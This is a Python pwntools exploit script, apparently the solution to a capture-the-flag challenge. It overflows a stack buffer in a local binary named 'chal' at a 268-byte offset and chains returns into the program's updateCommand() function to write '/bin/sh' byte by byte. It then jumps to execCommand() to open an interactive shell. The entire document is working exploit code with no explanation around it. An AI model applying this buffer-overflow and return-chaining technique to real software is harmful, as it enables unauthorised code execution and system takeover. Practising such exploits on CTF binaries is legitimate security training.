#!/usr/bin/python3
from pwn import process, p32, u8

shell = process("./chal")

offset = 268
junk = b"A" * offset

cmd = b"/bin/sh\x00"

for i in range(len(cmd)):
    payload  = b""
    payload += junk
    payload += p32(0x80491f3)      # updateCommand()
    payload += p32(0x8049248)      # vuln()
    payload += p32(i)              # index
    payload += p32(u8(cmd[i:i+1])) # character

    shell.sendlineafter(b"...\n", payload)

payload  = b""
payload += junk
payload += p32(0x804921d) # execCommand()

shell.sendlineafter(b"...\n", payload)
shell.interactive()
